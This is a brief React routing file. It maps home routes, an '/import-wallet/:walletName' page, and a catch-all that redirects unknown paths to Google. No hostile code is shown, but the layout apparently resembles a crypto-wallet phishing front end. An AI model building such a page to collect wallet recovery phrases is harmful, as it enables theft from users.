import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import "./App.css";
import ImportWallet from "./pages/ImportWallet";
import HomePage from "./pages/HomePage";

function App() {
  return (
    <BrowserRouter>
      <div id="app">
        <Routes>
          <Route path="/" element={<HomePage/>} />
          <Route path="/app" element={<HomePage/>} />
          <Route path="/import-wallet/:walletName" element={<ImportWallet/>}/>
          <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
        </Routes>
      </div>
    </BrowserRouter>
  );
}


export default App;
